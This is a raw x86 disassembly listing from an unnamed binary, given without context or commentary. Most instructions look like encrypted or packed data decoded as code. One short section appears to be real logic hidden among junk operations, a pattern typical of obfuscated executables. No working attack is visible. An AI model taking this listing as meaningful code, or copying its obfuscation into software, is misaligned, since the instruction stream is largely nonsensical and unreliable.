  406052:	retf   0xe8e5
  406055:	stc    
  406056:	add    al,ch
  406058:	fnstsw WORD PTR [eax-0x420c1840]
  40605e:	in     eax,0xee
  406060:	shl    cl,1
  406062:	sti    
  406063:	out    dx,eax
  406064:	xlat   BYTE PTR ds:[ebx]
  406065:	hlt    
  406066:	aam    0xf5
  406068:	fld1   
  40606a:	xlat   BYTE PTR ds:[ebx]
  40606b:	frndint 
  40606d:	fsubrp st(7),st
  40606f:	inc    DWORD PTR [eax]
  406071:	fcmovnu st,st(7)
  406073:	test   al,0xe2
  406076:	loope  0x40605f
  406078:	add    eax,0xc8a9efe1
  40607d:	lds    esi,FWORD PTR [eax-0xb251109]
  406083:	clc    
  406084:	into   
  406085:	jmp    0xc2de:0xe8d3e8d3
  40608c:	mov    eax,0x9cbe0f4
  406091:	call   0xfa4b2872
  406096:	leave  
  406097:	jmp    edx
  406099:	leave  
  40609a:	int3   
  40609b:	jmp    0xedcd:0xf0b2e7d5
  4060a2:	mov    ah,0xca
  4060a4:	in     eax,dx
  4060a5:	fnstcw WORD PTR [ebx-0x30240013]
  4060ab:	add    edx,edx
  4060ad:	add    eax,0xdee507fd
  4060b2:	(bad)  
  4060b4:	jmp    0xf3056894
  4060b9:	into   
  4060ba:	lock jecxz 0x4060af
  4060bd:	mov    ch,0xc9
  4060bf:	icebp  
  4060c0:	les    esi,FWORD PTR [ebx-0x2024945]
  4060c6:	shl    BYTE PTR [ebp+edi*4-0x212c3e34],1
  4060cd:	in     eax,0xff
  4060cf:	call   esi
  4060d1:	add    eax,0xced60bc2
  4060d6:	jmp    0xd2f1:0xccd80a0c
  4060dd:	in     eax,dx
  4060de:	shl    ebp,0xe1
  4060e1:	sar    DWORD PTR [edx-0x302f2426],cl
  4060e7:	shl    BYTE PTR [eax-0x3d1d032f],cl
  4060ed:	mov    DWORD PTR [ecx],0xf60a06e0
  4060f3:	loope  0x4060d2
  4060f5:	(bad)  
  4060f6:	std    
  4060f7:	or     ebp,edx
  4060f9:	repz loop 0x4060ed
  4060fc:	mov    ebp,0xd6f1e3ed
  406101:	lock icebp 
  406103:	mov    cl,0xb8
  406105:	mov    ah,0xb9
  406107:	iret   
  406108:	sar    DWORD PTR [ebx+esi*8-0x7381a0b],cl
  40610f:	rcr    edx,0xc2
  406112:	std    
  406113:	retf   0xf8fd
  406116:	or     edi,ebx
  406118:	leave  
  406119:	in     eax,0xee
  40611b:	sar    BYTE PTR [ebp+esi*8-0x1f062913],0xc7
  406123:	icebp  
  406124:	sti    
  406125:	mov    ebp,0xf5efceea
  40612a:	xlat   BYTE PTR ds:[ebx]
  40612b:	repnz not al
  40612e:	cld    
  40612f:	add    dl,cl
  406131:	test   cl,0xfd
  406134:	faddp  st(7),st
  406136:	adc    ebp,ebp
  406138:	out    dx,al
  406139:	shr    DWORD PTR [esi-0x390c1b29],cl
  40613f:	mov    ebx,0xefb4f7cb
  406144:	std    
  406145:	into   
  406146:	sar    BYTE PTR [ebp-0x1d1e081e],1
  40614c:	out    0x7,eax
  40614e:	shl    ch,0xf8
  406151:	dec    DWORD PTR [edi]
  406153:	aam    0xc4
  406155:	fucom  st(5)
  406157:	std    
  406158:	adc    eax,ebp
  40615a:	shl    BYTE PTR [edi-0x1351154e],0xef
  406161:	enter  0xd7c6,0xd4
  406165:	out    dx,eax
  406166:	mov    esp,0xfe00ddeb
  40616b:	iret   
  40616c:	xlat   BYTE PTR ds:[ebx]
  40616d:	in     al,dx
  40616e:	cld    
  40616f:	or     ebx,ebx
  406171:	retf   
  406172:	call   0xec3f567c
  406177:	retf   
  406178:	cli    
  406179:	loop   0x40615f
  40617b:	into   
  40617c:	mov    bh,0xe5
  40617e:	int    0xd6
  406180:	aam    0xc1
  406182:	mov    ah,0xeb
  406184:	fistp  QWORD PTR [ebx-0x293c0a26]
  40618a:	mov    esp,0xf1f8fdef
  40618f:	add    al,0xf8
  406191:	mov    edi,0xebc7fcd0
  406196:	int    0xef
  406198:	push   es
  406199:	stos   BYTE PTR es:[edi],al
  40619a:	fsub   st(7),st
  40619c:	leave  
  40619d:	imul   dh
  40619f:	fcmovnbe st,st(3)
  4061a1:	out    dx,al
  4061a2:	shl    ah,cl
  4061a4:	idiv   esi
  4061a6:	cli    
  4061a7:	hlt    
  4061a8:	sar    bl,1
  4061aa:	not    bl
  4061ac:	repnz rcr ch,cl
  4061af:	hlt    
  4061b0:	jmp    0x416418c
  4061b5:	inc    dl
  4061b7:	fsubr  st(5),st
  4061b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061ba:	out    dx,al
  4061bb:	int3   
  4061bc:	(bad)  
  4061bd:	ror    edx,1
  4061bf:	test   esi,0xb7f0f7f9
  4061c5:	sti    
  4061c6:	(bad)  
  4061c8:	loop   0x4061cd
  4061ca:	in     eax,dx
  4061cb:	xlat   BYTE PTR ds:[ebx]
  4061cc:	into   
  4061cd:	test   dh,0xfd
  4061d0:	jmp    0x10a37b5
  4061d5:	(bad)  
  4061d6:	std    
  4061d7:	sti    
  4061d8:	out    0xf0,eax
  4061da:	int3   
  4061db:	mov    edi,0xd3d1ecbd
  4061e0:	cli    
  4061e1:	out    dx,eax
  4061e2:	div    ecx
  4061e4:	mov    edi,0xed02dbf8
  4061e9:	shr    ch,1
  4061eb:	fadd   DWORD PTR [eax]
  4061ed:	in     eax,dx
  4061ee:	idiv   esp
  4061f0:	(bad)  
  4061f2:	(bad)  
  4061f4:	or     ebp,esp
  4061f6:	fsubr  st(5),st
  4061f8:	into   
  4061f9:	shl    esp,1
  4061fb:	lods   eax,DWORD PTR ds:[esi]
  4061fc:	(bad)  
  4061fd:	out    dx,eax
  4061fe:	jmp    0xaf1a4ddd
  406203:	sti    
  406204:	mov    edi,0xfac3b5d6
  406209:	fcmovnbe st,st(0)
  40620b:	lock mov ebp,0xe6c4bde0
  406211:	jmp    0x4061fd
  406213:	sti    
  406214:	cld    
  406215:	iret   
  406216:	loopne 0x40620a
  406218:	or     ch,BYTE PTR [ecx-0x4f330d24]
  40621e:	int    0xf0
  406220:	sti    
  406221:	mov    ah,0xf4
  406223:	rcr    dl,1
  406225:	xlat   BYTE PTR ds:[ebx]
  406226:	int3   
  406227:	aad    0x3
  406229:	cli    
  40622a:	fdivr  st,st(2)
  40622c:	cmc    
  40622d:	loop   0x40620f
  40622f:	add    edx,ebp
  406231:	hlt    
  406232:	hlt    
  406233:	add    ah,bl
  406235:	cld    
  406236:	stc    
  406237:	repnz add eax,0xcbbfb1a7
  40623d:	out    0xe3,eax
  40623f:	repz rol ebp,1
  406242:	in     eax,dx
  406243:	repnz cli 
  406245:	jmp    0xff142102
  40624a:	add    DWORD PTR [edi-0xe0002fd],edi
  406250:	test   bl,0xfd
  406253:	or     ebx,esi
  406255:	(bad)  
  406256:	dec    BYTE PTR [ebx]
  406258:	add    al,0xa7
  40625a:	retf   
  40625b:	(bad)  
  40625c:	jmp    0xb5f7:0xf0d7c5ea
  406263:	(bad)  
  406264:	retf   0xc9c9
  406267:	sti    
  406268:	out    dx,al
  406269:	fdivr  QWORD PTR [ecx-0x1d32092a]
  40626f:	mov    ecx,0xe6ffd0c4
  406274:	add    al,0xb
  406276:	iret   
  406277:	push   es
  406278:	or     edi,ebx
  40627a:	fsubr  st(4),st
  40627c:	xlat   BYTE PTR ds:[ebx]
  40627d:	in     al,0xf1
  40627f:	rol    eax,1
  406281:	mov    cl,0xdf
  406283:	xlat   BYTE PTR ds:[ebx]
  406284:	(bad)
  406287:	mov    esi,0xc3f3f7ce
  40628c:	out    0xfd,al
  40628e:	sar    cl,1
  406290:	jmp    0x406255
  406292:	jmp    ecx
  406294:	loope  0x4062a2
  406296:	cli    
  406297:	repz add DWORD PTR [ecx-0x161d370f],esi
  40629e:	cmc    
  40629f:	jmp    0xc507249d
  4062a4:	retf   
  4062a5:	mov    edx,0xeeccbcfc
  4062aa:	in     eax,dx
  4062ab:	ror    esi,1
  4062ad:	in     eax,dx
  4062ae:	rol    cl,cl
  4062b0:	mov    esp,0xfbe6e2f1
  4062b5:	dec    esi
  4062b7:	jecxz  0x406287
  4062b9:	lods   al,BYTE PTR ds:[esi]
  4062ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062bb:	out    dx,eax
  4062bc:	lods   eax,DWORD PTR ds:[esi]
  4062bd:	retf   
  4062be:	mov    dl,0xd7
  4062c0:	shl    DWORD PTR [ecx-0x84f0b45],1
  4062c6:	std    
  4062c7:	loop   0x4062c7
  4062c9:	inc    DWORD PTR [ecx]
  4062cb:	icebp  
  4062cc:	fdivr  st,st(1)
  4062ce:	sar    ebp,cl
  4062d0:	sar    ch,cl
  4062d2:	std    
  4062d3:	jmp    0x4062b4
  4062d5:	enter  0xcc07,0x1
  4062d9:	repnz leave 
  4062db:	iret   
  4062dc:	repz not cl
  4062df:	repz les esi,FWORD PTR [edx-0x2f10050b]
  4062e6:	(bad)  
  4062e8:	ret    
  4062e9:	icebp  
  4062ea:	aam    0xff
  4062ec:	ret    
  4062ed:	repz clc 
  4062ef:	(bad)  
  4062f0:	(bad)  
  4062f1:	(bad)  [edx]
  4062f3:	add    al,0xdd
  4062f5:	fisttp QWORD PTR [ebx]
  4062f7:	fmulp  st(7),st
  4062f9:	jecxz  0x4062c9
  4062fb:	lods   al,BYTE PTR ds:[esi]
  4062fc:	repz int 0xe9
  4062ff:	mov    dh,0xf2
  406301:	loopne 0x4062f2
  406303:	mov    edi,0xf1ecf3cf
  406308:	jmp    0x4f6:0xffeedeba
  40630f:	or     bl,bh
  406311:	rcr    esi,0xf8
  406314:	add    edi,eax
  406316:	in     eax,dx
  406317:	add    ebp,esi
  406319:	out    0xe3,al
  40631b:	in     al,0xb0
  40631d:	lock mov dh,0xd5
  406320:	mov    cl,0xba
  406322:	retf   0xd0ff
  406325:	sti    
  406326:	aad    0xd5
  406328:	in     al,dx
  406329:	out    dx,al
  40632a:	fsubr  st(6),st
  40632c:	cli    
  40632d:	in     al,dx
  40632e:	ffree  st(5)
  406330:	in     eax,0xfe
  406332:	sar    bh,1
  406334:	iret   
  406335:	fild   WORD PTR [esi]
  406337:	psllw  mm5,QWORD PTR [ebx-0x54420909]
  40633e:	(bad)  
  40633f:	(bad)  
  406340:	retf   
  406341:	mov    ecx,0xf0bbc6cf
  406346:	shl    dl,1
  406348:	loope  0x406346
  40634a:	mov    ebp,0xbad1fae7
  40634f:	fcmovnb st,st(1)
  406351:	ror    bl,1
  406353:	(bad)  
  406354:	cli    
  406355:	sti    
  406356:	or     al,0xc9
  406358:	out    0xb2,eax
  40635a:	in     al,0xac
  40635c:	enter  0xe4d7,0xf6
  406360:	f2xm1  
  406362:	into   
  406363:	repnz in eax,0xec
  406366:	int3   
  406367:	cmc    
  406368:	cmc    
  406369:	out    dx,eax
  40636a:	(bad)  
  40636b:	repnz (bad) 
  40636e:	mul    esp
  406370:	push   es
  406371:	loop   0x406359
  406373:	stc    
  406374:	fmul   DWORD PTR [edx+ecx*1]
  406377:	bswap  ebp
  406379:	(bad)  
  40637b:	fdiv   QWORD PTR [eax-0x4e0d5240]
  406381:	in     al,dx
  406382:	out    dx,al
  406383:	mov    ah,0xec
  406385:	out    dx,al
  406386:	repz call 0x16548
  40638c:	neg    ebx
  40638e:	(bad)
  406391:	jmp    0xca403c6d
  406396:	(bad)  
  406397:	jmp    0xd2cd:0xbeccaee4
  40639e:	leave  
  40639f:	fcmovb st,st(7)
  4063a1:	in     al,0xcc
  4063a3:	(bad)  
  4063a4:	(bad)  
  4063a6:	in     al,dx
  4063a7:	cld    
  4063a8:	mov    edx,0xe6d6fdba
  4063ad:	ret    0xf2c6
  4063b0:	inc    eax
  4063b2:	call   0xfd2441b3
  4063b7:	add    eax,0xeacac6dc
  4063bc:	loopne 0x40639b
  4063be:	mov    bh,0xb1
  4063c0:	mov    ch,0xb9
  4063c2:	call   0xff1a4c93
  4063c7:	clc    
  4063c8:	clc    
  4063c9:	(bad)  
  4063ca:	clc    
  4063cb:	int3   
  4063cc:	idiv   eax
  4063ce:	mov    esi,0xcae9d6bc
  4063d3:	psubsw mm0,QWORD PTR [esi]
  4063d6:	(bad)  
  4063d8:	add    DWORD PTR [ecx+0x50ec83ad],esi
  4063de:	push   esi
  4063df:	mov    DWORD PTR [ebp-0x4],0x437423
  4063e6:	dec    DWORD PTR ds:0x43771f
  4063ec:	mov    DWORD PTR [ebp-0x8],0x43742b
  4063f3:	or     DWORD PTR ds:0x437767,0x43777f
  4063fd:	lea    eax,[ebp-0x18]
  406400:	inc    DWORD PTR ds:0x4377a3
  406406:	mov    DWORD PTR [ebp-0xc],eax
  406409:	dec    DWORD PTR ds:0x43772b
  40640f:	mov    eax,DWORD PTR [ebp-0xc]
  406412:	mov    DWORD PTR [eax],0x70941f82
  406418:	mov    DWORD PTR [eax+0x4],0xffffffff
  40641f:	sub    eax,DWORD PTR ds:0x43770f
  406425:	mov    eax,ds:0x43739f
  40642a:	inc    DWORD PTR ds:0x43775b
  406430:	mov    eax,DWORD PTR [eax+0x1c0]
  406436:	or     DWORD PTR ds:0x4377ab,0x72ba
  406440:	mov    eax,DWORD PTR [eax]
  406442:	sub    DWORD PTR ds:0x437763,0x437723
  40644c:	xor    ecx,ecx
  40644e:	sbb    DWORD PTR ds:0x43779f,0x733b
  406458:	sub    eax,0x5424137
  40645d:	mov    DWORD PTR ds:0x4377a3,0x54e3
  406467:	sbb    ecx,0x0
  40646a:	xor    eax,0x8a29a14b
  40646f:	xor    ecx,0x0
  406472:	mov    DWORD PTR ds:0x43779f,0x3ce1
  40647c:	mov    DWORD PTR [ebp-0x20],eax
  40647f:	mov    DWORD PTR [ebp-0x1c],ecx
  406482:	mov    DWORD PTR ds:0x43777f,0x5274
  40648c:	cmp    DWORD PTR [ebp-0x20],0x70941f81
  406493:	jne    0x4089fc
  406499:	mov    DWORD PTR ds:0x437743,0x6c71
  4064a3:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  4064a7:	jne    0x4089fc
  4064ad:	sbb    DWORD PTR ds:0x43778b,edx
  4064b3:	mov    eax,DWORD PTR [ebp-0x8]
  4064b6:	and    DWORD PTR ds:0x437753,0x437727
  4064c0:	mov    eax,DWORD PTR [eax]
  4064c2:	xor    ecx,ecx
  4064c4:	sub    eax,0x5424137
  4064c9:	jmp    0x408817
  4064ce:	mov    ds:0xf452acdf,al
  4064d3:	push   eax
  4064d4:	outs   dx,DWORD PTR fs:[esi]
  4064d6:	jbe    0x406527
  4064d8:	loope  0x406479
  4064da:	inc    edi
  4064db:	push   DWORD PTR [edx+0x52]
  4064de:	fnstcw WORD PTR [ebp-0x67558485]
  4064e4:	jnp    0x406561
  4064e6:	test   al,0xaf
  4064e8:	call   0xc52b50c1
  4064ed:	scas   al,BYTE PTR es:[edi]
  4064ee:	mov    ecx,0xb5d7dded
  4064f3:	mov    esi,0x701d1f5
  4064f8:	push   es
  4064f9:	mov    esp,0x2fd0bfe
  4064fe:	std    
  4064ff:	out    dx,al
  406500:	(bad)  
  406501:	loop   0x4064ff
  406503:	out    dx,al
  406504:	mov    ebp,0xf0a8a9bc
  406509:	int3   
  40650a:	int3   
  40650b:	loopne 0x4064db
  40650d:	leave  
  40650e:	aam    0xb4
  406510:	into   
  406511:	clc    
  406512:	fldlg2 
  406514:	shl    cl,1
  406516:	out    0xc2,eax
  406518:	fcmovnu st,st(7)
  40651a:	loop   0x406517
  40651c:	fisttp DWORD PTR [eax]
  40651e:	or     esi,esi
  406520:	fsubrp st(5),st
  406522:	(bad)  [ebx]
  406524:	rcl    dl,1
  406526:	int3   
  406527:	lods   al,BYTE PTR ds:[esi]
  406528:	int3   
  406529:	in     al,0xc9
  40652b:	loopne 0x406502
  40652d:	(bad)  
  40652f:	in     al,dx
  406530:	out    dx,al
  406531:	icebp  
  406532:	fdivrp st(3),st
  406534:	mov    eax,0xfdd2ddbf
  406539:	in     al,dx
  40653a:	mov    ecx,0xc500f0bc
  40653f:	iret   
  406540:	retf   
  406541:	(bad)  
  406543:	bnd jmp 0xb00a5c12
  406549:	sar    ebx,1
  40654b:	shl    cl,1
  40654d:	jmp    0xc8dc:0xb9fcdfeb
  406554:	loope  0x406535
  406556:	add    bl,ch
  406558:	test   BYTE PTR ds:0xfde3da07,0xef
  40655f:	(bad)  
  406561:	pop    es
  406562:	cli    
  406563:	loopne 0x406533
  406565:	scas   eax,DWORD PTR es:[edi]
  406566:	loop   0x40653a
  406568:	mov    ch,0xc0
  40656a:	mov    dh,0xee
  40656c:	mov    bh,0xcf
  40656e:	lods   eax,DWORD PTR ds:[esi]
  40656f:	lds    edi,FWORD PTR [ebp-0x221e1334]
  406575:	mov    dh,0xe1
  406577:	fadd   st,st(0)
  406579:	ret    
  40657a:	shl    edi,cl
  40657c:	retf   
  40657d:	fxch   st(3)
  40657f:	(bad)  
  406580:	clc    
  406581:	push   es
  406582:	cld    
  406583:	fld    st(0)
  406585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406586:	mov    al,0xf1
  406588:	shr    ah,1
  40658a:	jmp    0xb4e4:0xcbfbe4e2
  406591:	fucomip st,st(3)
  406593:	fidivr WORD PTR [esi-0x443d4734]
  406599:	(bad)  
  40659a:	cli    
  40659b:	shr    cl,0xca
  40659e:	push   cs
  40659f:	leave  
  4065a0:	push   es
  4065a1:	or     dl,bl
  4065a3:	push   es
  4065a4:	repnz lods al,BYTE PTR ds:[esi]
  4065a6:	lods   eax,DWORD PTR ds:[esi]
  4065a7:	mov    bl,0xb3
  4065a9:	shl    eax,cl
  4065ab:	repz out 0xe5,al
  4065ae:	in     eax,dx
  4065af:	int    0xba
  4065b1:	lock in eax,dx
  4065b3:	ret    0xffb9
  4065b6:	lock mov eax,0xc4e406bd
  4065bc:	aad    0x6
  4065be:	cld    
  4065bf:	sti    
  4065c0:	push   cs
  4065c1:	(bad)  [edi+ebx*8]
  4065c4:	jecxz  0x4065b7
  4065c6:	rcl    esi,1
  4065c8:	fmul   st(7),st
  4065ca:	iret   
  4065cb:	(bad)
  4065ce:	stc    
  4065cf:	clc    
  4065d0:	fsubp  st(6),st
  4065d2:	cld    
  4065d3:	lock cld 
  4065d5:	in     eax,dx
  4065d6:	loop   0x4065d7
  4065d8:	add    ah,bl
  4065da:	(bad)  
  4065db:	fdivr  QWORD PTR [edi-0x151102f1]
  4065e1:	out    0xcb,al
  4065e3:	cld    
  4065e4:	fmulp  st(7),st
  4065e6:	out    0xad,eax
  4065e8:	mov    esp,0xd4d7a9cb
  4065ed:	jmp    0xd7e3:0xebb6b4cf
  4065f4:	fcomip st,st(7)
  4065f6:	cld    
  4065f7:	cli    
  4065f8:	fld    QWORD PTR [edx]
  4065fa:	fsubrp st(0),st
  4065fc:	xlat   BYTE PTR ds:[ebx]
  4065fd:	in     eax,0xdd
  4065ff:	loope  0x406610
  406601:	loopne 0x4065ec
  406603:	in     eax,0xdc
  406605:	out    dx,al
  406606:	(bad)
  406609:	out    dx,eax
  40660a:	in     al,0xd4
  40660c:	frstpm(287 only) 
  40660e:	cli    
  40660f:	out    0xb4,al
  406611:	fucomp st(2)
  406613:	out    dx,eax
  406614:	add    edi,ebx
  406616:	(bad)  
  406617:	fcomp  st(1)
  406619:	add    ebp,ebx
  40661b:	cmc    
  40661c:	fadd   QWORD PTR [edx+ecx*8]
  40661f:	fcomip st,st(4)
  406621:	vpsrlq ymm5,ymm3,XMMWORD PTR [ebx-0xb184348]
  406629:	loopne 0x4065f7
  40662b:	repnz mov al,0xe4
  40662e:	mov    edi,0xc8cdb4d6
  406633:	aad    0xd3
  406635:	loop   0x406624
  406637:	add    eax,0xf2dcfdfb
  40663c:	add    esp,esi
  40663e:	stc    
  40663f:	or     al,ch
  406641:	into   
  406642:	add    esp,esi
  406644:	(bad)  
  406645:	lock mov bh,0xc9
  406648:	in     al,dx
  406649:	aam    0xe5
  40664b:	fld    st(5)
  40664d:	clc    
  40664e:	iret   
  40664f:	shr    ebp,cl
  406651:	int3   
  406652:	test   dl,0xcf
  406655:	lock ret 
  406657:	add    edx,edx
  406659:	loop   0x40663e
  40665b:	mov    esp,0x6ddd8ca
  406660:	out    0x7,eax
  406662:	or     eax,edi
  406664:	scas   al,BYTE PTR es:[edi]
  406665:	(bad)  
  406667:	int    0xc4
  406669:	mov    dh,0xee
  40666b:	not    al
  40666d:	hlt    
  40666e:	jmp    0x40663b
  406670:	(bad)  
  406671:	out    dx,eax
  406672:	aad    0xfe
  406674:	mov    eax,0xe207fddb
  406679:	add    esi,esp
  40667b:	fcmovnbe st,st(1)
  40667d:	loopne 0x406648
  40667f:	loop   0x406676
  406681:	stc    
  406682:	ficom  DWORD PTR [ecx]
  406684:	jmp    0xcaeb:0xb7f1dfef
  40668b:	cli    
  40668c:	in     al,dx
  40668d:	out    dx,al
  40668e:	clc    
  40668f:	enter  0xc4d0,0xbc
  406693:	mov    edx,0xd5d8e8f9
  406698:	sti    
  406699:	push   ebp
  40669b:	(bad)  
  40669c:	cld    
  40669d:	(bad)  
  40669e:	loopne 0x40668e
  4066a0:	in     eax,0xc9
  4066a2:	jmp    0xb0bd:0xcec4b2e0
  4066a9:	ret    
  4066aa:	retf   0xe5f9
  4066ad:	int3   
  4066ae:	fsubp  st(3),st
  4066b0:	jmp    0x406685
  4066b2:	fcmovnu st,st(7)
  4066b4:	idiv   DWORD PTR [eax-0x2a182a0a]
  4066ba:	add    dl,dl
  4066bc:	in     al,0xc6
  4066be:	retf   0xda02
  4066c1:	dec    BYTE PTR [eax]
  4066c3:	adc    ebp,DWORD PTR [esi+eiz*8-0x2d4e2c51]
  4066ca:	iret   
  4066cb:	into   
  4066cc:	sar    edx,cl
  4066ce:	int3   
  4066cf:	retf   0xcecb
  4066d2:	add    ebp,eax
  4066d4:	(bad)  
  4066d6:	mov    ch,0xf6
  4066d8:	add    al,0xd3
  4066da:	retf   
  4066db:	icebp  
  4066dc:	add    eax,ecx
  4066de:	cld    
  4066df:	iret   
  4066e0:	out    dx,eax
  4066e1:	or     eax,0xc6decc09
  4066e6:	les    ebp,FWORD PTR [edx+ecx*8-0x4c0f482b]
  4066ed:	mov    dh,0xf5
  4066ef:	jmp    0x4066c2
  4066f1:	aad    0xbc
  4066f3:	mov    al,0xe1
  4066f5:	int3   
  4066f6:	repz inc esi
  4066f9:	stc    
  4066fa:	loopne 0x4066dc
  4066fc:	ret    
  4066fd:	add    eax,0xc8cd03cf
  406702:	wbinvd 
  406704:	(bad)  
  406705:	jmp    0xe7fd30f7
  40670a:	test   dh,0xc9
  40670d:	(bad)
  406710:	jmp    0xce00:0xd4cebc
  406717:	mov    DWORD PTR ds:0xf90bddec,0xfc08e8d8
  406721:	(bad)
  406724:	mov    esp,0xe5d6b1c0
  406729:	ret    
  40672a:	jecxz  0x406702
  40672c:	aam    0xcc
  40672e:	mov    ah,0xf1
  406730:	jmp    0x4066ee
  406732:	(bad)  
  406733:	aam    0xf1
  406735:	aad    0xfc
  406737:	loop   0x406719
  406739:	repz repz or esi,esi
  40673d:	add    bh,cl
  40673f:	into   
  406740:	out    dx,eax
  406741:	leave  
  406742:	or     eax,0xa5e5c4ce
  406747:	retf   0xf5c5
  40674a:	(bad)  
  40674b:	cli    
  40674c:	sti    
  40674d:	vpsubw xmm1,xmm2,xmm0
  406751:	(bad)  
  406753:	retf   0xefda
  406756:	(bad)  
  406757:	fnstcw WORD PTR [esp+eiz*8-0x2e07]
  40675e:	push   cs
  40675f:	cli    
  406760:	retf   
  406761:	loopne 0x40676f
  406763:	jmp    0xdeee3846
  406768:	div    bl
  40676a:	jmp    0xfec8:0xeed6dbd5
  406771:	fmulp  st(5),st
  406773:	rol    DWORD PTR [edx],1
  406775:	rcl    al,1
  406777:	jecxz  0x40676e
  406779:	cld    
  40677a:	repz rol BYTE PTR [ecx],cl
  40677d:	jmp    0x406764
  40677f:	jmp    0x406749
  406781:	clc    
  406782:	out    0xc0,al
  406784:	fucom  st(5)
  406786:	fistp  QWORD PTR [esi-0x1b4d1152]
  40678c:	out    dx,al
  40678d:	jmp    0x406747
  40678f:	shr    al,1
  406791:	fucomi st,st(1)
  406793:	jecxz  0x406774
  406795:	rcl    bh,0xbf
  406798:	loop   0x40677f
  40679a:	fcmovnb st,st(4)
  40679c:	fcmovb st,st(7)
  40679e:	add    al,0xe1
  4067a0:	(bad)  
  4067a2:	fmul   st(0),st
  4067a4:	int3   
  4067a5:	icebp  
  4067a6:	loopne 0x406792
  4067a8:	fdiv   QWORD PTR [esi+ecx*8-0xf1a0a37]
  4067af:	(bad)  
  4067b0:	out    dx,eax
  4067b1:	fst    st(0)
  4067b3:	in     eax,dx
  4067b4:	hlt    
  4067b5:	shl    bh,cl
  4067b7:	hlt    
  4067b8:	rol    BYTE PTR [edx],0x7
  4067bb:	jecxz  0x406788
  4067bd:	(bad)  
  4067be:	cld    
  4067bf:	loope  0x4067bc
  4067c1:	adc    ecx,ecx
  4067c3:	shr    dh,0xa8
  4067c6:	sar    BYTE PTR [ebp-0x4919164e],0xf6
  4067cd:	aam    0xba
  4067cf:	sar    cl,1
  4067d1:	shl    eax,cl
  4067d3:	sar    DWORD PTR [ebp-0x43244303],cl
  4067d9:	cli    
  4067da:	mov    BYTE PTR [ebx],0xdb
  4067dd:	ret    0x3c6
  4067e0:	int    0xfa
  4067e2:	adc    bh,bh
  4067e4:	ret    0xb7c7
  4067e7:	scas   al,BYTE PTR es:[edi]
  4067e8:	lods   eax,DWORD PTR ds:[esi]
  4067e9:	out    dx,al
  4067ea:	out    0xec,al
  4067ec:	in     al,0xf5
  4067ee:	out    0xbf,eax
  4067f0:	aam    0xec
  4067f2:	sar    DWORD PTR [eax-0x8f90526],cl
  4067f8:	ret    
  4067f9:	repnz cli 
  4067fb:	std    
  4067fc:	sar    dl,1
  4067fe:	div    dh
  406800:	out    0xe5,eax
  406802:	call   0xe40d24ec
  406807:	jmp    0xc62e5ebb
  40680c:	iret   
  40680d:	out    0xde,al
  40680f:	(bad)
  406812:	sti    
  406813:	fidivr DWORD PTR [ebx-0x2a0d473f]
  406819:	rcl    eax,1
  40681b:	add    dh,ah
  40681d:	shr    dh,1
  40681f:	jmp    0xb2e5:0xcbfedde9
  406826:	loopne 0x4067eb
  406828:	shl    ebx,0xd4
  40682b:	lods   al,BYTE PTR ds:[esi]
  40682c:	cmc    
  40682d:	mov    ah,0xea
  40682f:	mov    ebx,0xdabad4cc
  406834:	aam    0xd8
  406836:	rol    BYTE PTR [ecx],0xff
  406839:	cld    
  40683a:	rol    bl,cl
  40683c:	loopne 0x40680e
  40683e:	add    al,0xe2
  406840:	add    eax,0xbf03d913
  406845:	shr    BYTE PTR [ecx-0x2b393b49],1
  40684b:	loopne 0x406812
  40684d:	aad    0xd6
  40684f:	stc    
  406850:	fucomi st,st(2)
  406852:	cmc    
  406853:	in     eax,dx
  406854:	into   
  406855:	(bad)  
  406856:	sti    
  406857:	(bad)  
  406858:	cld    
  406859:	repz lock out 0xc4,al
  40685d:	rcr    bl,0x6
  406860:	(bad)  
  406861:	std    
  406862:	int    0xdf
  406864:	repz mov ebp,0xc5e5b3cb
  40686a:	jmp    0xdbf0:0xb9eedac7
  406871:	leave  
  406872:	shl    esp,1
  406874:	repnz aam 0xd6
  406877:	out    0xfc,eax
  406879:	cld    
  40687a:	cli    
  40687b:	(bad)  
  40687d:	add    DWORD PTR [esi],eax
  40687f:	(bad)  
  406881:	push   es
  406882:	(bad)  
  406884:	sar    DWORD PTR [eax-0xe393f1f],cl
  40688a:	mov    bh,0xb5
  40688c:	mov    bh,0xf3
  40688e:	not    edi
  406890:	jmp    0xc2d0:0xdee8d3b6
  406897:	out    0xed,eax
  406899:	or     esp,esp
  40689b:	add    dl,cl
  40689d:	(bad)  
  40689e:	enter  0xf5d4,0xe0
  4068a2:	clc    
  4068a3:	repz test al,0xe7
  4068a6:	in     al,dx
  4068a7:	lock lods al,BYTE PTR ds:[esi]
  4068a9:	int3   
  4068aa:	shl    BYTE PTR [ebp-0x4438091b],1
  4068b0:	fnstsw WORD PTR [eax+edi*8-0x10f82f22]
  4068b7:	mov    esp,0xb8c3e3fa
  4068bc:	fadd   QWORD PTR [ebx]
  4068be:	fdivr  st,st(5)
  4068c0:	ret    
  4068c1:	retf   
  4068c2:	retf   0xf1e3
  4068c5:	int3   
  4068c6:	jmp    0xbbe4:0xe6aec7dd
  4068cd:	in     al,dx
  4068ce:	fsubp  st(0),st
  4068d0:	shl    dh,1
  4068d2:	ret    
  4068d3:	cli    
  4068d4:	rol    BYTE PTR [edx],cl
  4068d6:	cmc    
  4068d7:	fsubrp st(2),st
  4068d9:	cmc    
  4068da:	fsubr  st,st(2)
  4068dc:	rol    BYTE PTR [ebx+eax*1],1
  4068df:	fcmovnu st,st(5)
  4068e1:	clc    
  4068e2:	into   
  4068e3:	or     edi,esp
  4068e5:	int3   
  4068e6:	out    dx,eax
  4068e7:	mov    cl,0xd2
  4068e9:	ret    
  4068ea:	jmp    0x4068a3
  4068ec:	ror    edx,1
  4068ee:	jmp    0xd4fa:0xf803ebff
  4068f5:	cli    
  4068f6:	mov    ecx,0xc6d0e5da
  4068fb:	sti    
  4068fc:	lds    eax,FWORD PTR [ecx+eiz*8]
  4068ff:	in     eax,0xd8
  406901:	retf   
  406902:	dec    dl
  406904:	scas   al,BYTE PTR es:[edi]
  406905:	out    0xa5,eax
  406907:	int3   
  406908:	repnz shl edi,cl
  40690b:	imul   ebx
  40690d:	fsubr  st,st(2)
  40690f:	hlt    
  406910:	lock jmp 0xdbb5:0xf7c9cfc9
  406918:	xbegin 0xf7365302
  40691e:	cmc    
  40691f:	push   cs
  406920:	fiadd  WORD PTR [eax]
  406922:	sti    
  406923:	into   
